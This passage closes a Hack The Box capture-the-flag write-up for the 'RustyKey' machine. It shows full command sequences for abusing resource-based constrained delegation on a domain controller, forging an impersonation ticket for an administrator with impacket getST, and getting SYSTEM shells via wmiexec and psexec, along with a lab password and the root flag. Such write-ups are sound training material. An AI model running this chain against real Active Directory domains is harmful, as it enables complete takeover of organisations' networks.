&rarr; We gonna use [Get-ADComputer](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adcomputer?view=windowsserver2025-ps) to get the `DC.RUSTYKEY.HTB` computer object.

```powershell
PS C:\Windows> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount


DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
DNSHostName                          : dc.rustykey.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
PrincipalsAllowedToDelegateToAccount : {CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb}
SamAccountName                       : DC$
SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
UserPrincipalName                    :
```

We see that `DC` have **Allowed To Act On Behalf Of Other Identity** (Resource-Based Constrained Delegation) to `IT-Computer3` user. <br>
In the bloodhound refs, I found this [rbcd](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) and see that `IT-Computer3` has the **PrincipalsAllowedToDelegateToAccount** which mean "trust this computer for delegation". <br>
&rarr; We can able to reassign **PrincipalsAllowedToDelegateToAccount** to contain only `IT-Computer3$`.

```powershell
PS C:\Windows> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount "IT-COMPUTER3$"
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount "IT-COMPUTER3$"
PS C:\Windows>
```

Now `IT-Computer3` is allowed to impersonate any user when accessing resources on `DC`. After reading the [rbcd](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd), we can able to obtain the ticket through [s4u2self](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse). <br>
&rarr; We gonna do it with `backupadmin` user.

```bash
└─$ getST.py -spn 'cifs/DC.RUSTYKEY.HTB' -impersonate backupadmin -dc-ip 10.129.4.62 -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating backupadmin
/usr/local/bin/getST.py:378: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/local/bin/getST.py:475: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/local/bin/getST.py:605: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/local/bin/getST.py:657: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_DC.RUSTYKEY.HTB@RUSTYKEY.HTB.ccache
```

We can use the from [impacket-getST](https://github.com/paranoidninja/Pandoras-Box/blob/master/python/impacket-scripts/getST.py) to get the ticket.

```bash
└─$ impacket-getST -spn 'cifs/DC.RUSTYKEY.HTB' -impersonate backupadmin -dc-ip 10.129.4.62 -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_DC.RUSTYKEY.HTB@RUSTYKEY.HTB.ccache
```

Now we can able to activate the ticket and use [wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) to get the shell.

```bash
└─$ wmiexec.py -k -no-pass 'RUSTYKEY.HTB/backupadmin@dc.rustykey.htb'     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
rustykey\backupadmin
```

![BloodHound](/assets/img/rustykey-htb-season8/bloodhound_8.png)

We can see that `backupadmin` is member of `ADMINISTRATORS@RUSTYKEY.HTB` group. <br>

```bash
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 00BA-0DBE

 Directory of C:\Users\Administrator\Desktop

06/24/2025  10:00 AM    <DIR>          .
06/24/2025  10:00 AM    <DIR>          ..
06/30/2025  09:23 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,799,710,208 bytes free

C:\Users\Administrator\Desktop>type root.txt
b46d79aa99ba745b343e874e675ae129
```

Nailed the `root.txt` flag.

We can also run [psexec](https://github.com/veso266/impacket/blob/master/examples/psexec.py) and we know that `backupadmin` is member of `administrators` group. <br>
&rarr; We can able to get the shell as `NT AUTHORITY\SYSTEM`.

```bash
└─$ psexec.py -k -no-pass 'RUSTYKEY.HTB/backupadmin@dc.rustykey.htb'      
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.rustykey.htb.....
[*] Found writable share ADMIN$
[*] Uploading file rFPLWAqZ.exe
[*] Opening SVCManager on dc.rustykey.htb.....
[*] Creating service BqCY on dc.rustykey.htb.....
[*] Starting service BqCY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

This machine is great with some privilege escalation techniques but the things is that sometimes the machine quite buggy so we need to reset the machine and type out command again and again. There is one part when getting the `mm.turner` session, you need to prepare command to run cause it will disconnect really fast and have to redo the command again and have to wait for a while to get the session again :).

*Shout out again to [2ubZ3r0](https://app.hackthebox.com/users/682632) for helping me a lot with this machine.*

![result](/assets/img/rustykey-htb-season8/result.png)